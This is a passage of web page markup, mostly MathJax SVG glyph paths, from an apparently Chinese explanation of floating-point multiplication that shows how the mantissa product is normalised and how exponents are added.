285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mo" transform="translate(49666.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(50722.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(52279.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(53279.8,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(54766.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(55766.6,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(57323.9,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msub" transform="translate(58046.1,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mtext" transform="translate(59310.4,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mo" transform="translate(59560.4,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path></g><g data-mml-node="msub" transform="translate(60005.1,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mo" transform="translate(61138.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(62193.8,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(63339.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(64339.3,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></svg></mjx-container></span> 这里有两个问题需要进行解决：</p>
<ul>
<li>乘法运算之后m的值域成了 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.778ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2111.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
我们需要进行处理将其归为标准的 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.778ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2111.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> ，采用的公式如下：</li>
</ul>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="44.919ex" height="4.588ex" role="img" focusable="false" viewBox="0 -1342 19854.2 2028"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(1722.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2878.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3934,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4323,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5045.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6045.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6545.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7156.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(8156.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8545.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9646.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(10646.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(11146.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11813.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(12868.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(13257.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(13980.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(14980.3,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1100.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2100.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mn" transform="translate(1270.2,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="2800.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(18020.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18632,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mn" transform="translate(19354.2,0)"><path 